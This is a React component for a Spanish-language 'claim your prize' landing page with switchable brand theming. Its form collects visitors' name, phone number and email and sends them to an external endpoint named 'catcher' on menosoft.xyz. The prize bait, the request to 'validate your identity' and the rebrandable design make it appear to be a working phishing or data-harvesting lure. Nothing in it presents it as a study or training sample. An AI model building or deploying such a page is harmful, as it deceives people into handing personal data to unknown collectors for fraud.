import React, { useEffect, useState } from 'react';
import './App.css';

function getBrandFromURL() {
  const params = new URLSearchParams(window.location.search);
  return params.get('brand') || '';
}

function applyBrandTheme(brand) {
  const root = document.documentElement;
  const defaultPlaceholder =
    'url("https://via.placeholder.com/1600x900/0f172a/ffffff?text=Hero+Background")';

  if (brand === 'super-duper') {
    root.style.setProperty('--hero-background-image', 'url("/backgrounds/super-duper.png")');
  } else {
    root.style.setProperty('--hero-background-image', defaultPlaceholder);
    // TODO: Replace the placeholder URL above with the final default hero background image.
  }

  document.body.style.backgroundColor = '#f1f5f9';
  document.body.style.backgroundImage = 'none';
}

export default function App() {
  const [message, setMessage] = useState('');
  const brand = getBrandFromURL();
  const isSuccessMessage = message.startsWith('¡Gracias');

  useEffect(() => {
    applyBrandTheme(brand);
  }, [brand]);

  const handleSubmit = async (event) => {
    event.preventDefault();
    const form = event.target;
    const data = {
      firstName: form.firstName.value,
      lastName: form.lastName.value,
      phone: form.phone.value,
      email: form.email.value,
    };

    try {
      const response = await fetch('https://menosoft.xyz/catcher/submit', {
        method: 'POST',
        headers: {
          'Content-Type': 'application/json',
          'x-form-secret': import.meta.env.VITE_X_FORM_SECRET,
        },
        body: JSON.stringify(data),
      });

      if (response.ok) {
        setMessage('¡Gracias! Te enviaremos un correo de confirmación pronto.');
        form.reset();
      } else {
        const error = await response.text();
        setMessage('Error: ' + error);
      }
    } catch (err) {
      setMessage('Error de red: ' + err);
    }
  };

  return (
    <div className="app-shell">
      <section className="hero">
        <div className="hero__content">
          {/* TODO: Replace the src below with the final title graphic once available. */}
          <img
            className="hero__logo"
            src="https://via.placeholder.com/360x120/ffffff/0f172a?text=Tu+logo+aqu%C3%AD"
            alt="Nombre de la promoción"
          />
          <h1>Reclama tu premio</h1>
          <p>
            Completa el formulario para validar tu participación y recibir el premio exclusivo que
            preparamos para ti.
          </p>
          <ul className="hero__highlights">
            <li>Confirmación directa en tu correo electrónico.</li>
            <li>Seguimiento personalizado durante el proceso.</li>
            <li>Beneficios adicionales para clientes seleccionados.</li>
          </ul>
        </div>
      </section>

      <main className="form-section">
        <div className="form-card">
          <h2>Ingresa tus datos</h2>
          <p className="form-subtitle">
            Usa la misma información con la que te registraste para que podamos validar tu identidad
            correctamente.
          </p>

          <form id="userForm" autoComplete="on" onSubmit={handleSubmit} className="form-grid">
            <label htmlFor="firstName">Nombre</label>
            <input
              type="text"
              id="firstName"
              name="firstName"
              required
              autoComplete="given-name"
              placeholder="Escribe tu nombre"
            />

            <label htmlFor="lastName">Apellido</label>
            <input
              type="text"
              id="lastName"
              name="lastName"
              required
              autoComplete="family-name"
              placeholder="Escribe tu apellido"
            />

            <label htmlFor="phone">Número de teléfono</label>
            <input
              type="tel"
              id="phone"
              name="phone"
              required
              autoComplete="tel"
              inputMode="tel"
              pattern="[0-9+\\-\\s]{7,15}"
              placeholder="Ej. +34 600 000 000"
            />

            <label htmlFor="email">Correo electrónico</label>
            <input
              type="email"
              id="email"
              name="email"
              required
              autoComplete="email"
              placeholder="tucorreo@ejemplo.com"
            />

            <button type="submit">Enviar</button>
          </form>

          {message && (
            <div className={`form-message ${isSuccessMessage ? 'is-success' : 'is-error'}`} role="status">
              {message}
            </div>
          )}

          <small className="form-disclaimer">
            Al enviar este formulario aceptas que nos comuniquemos contigo para completar la gestión del premio.
          </small>
        </div>
      </main>
    </div>
  );
}
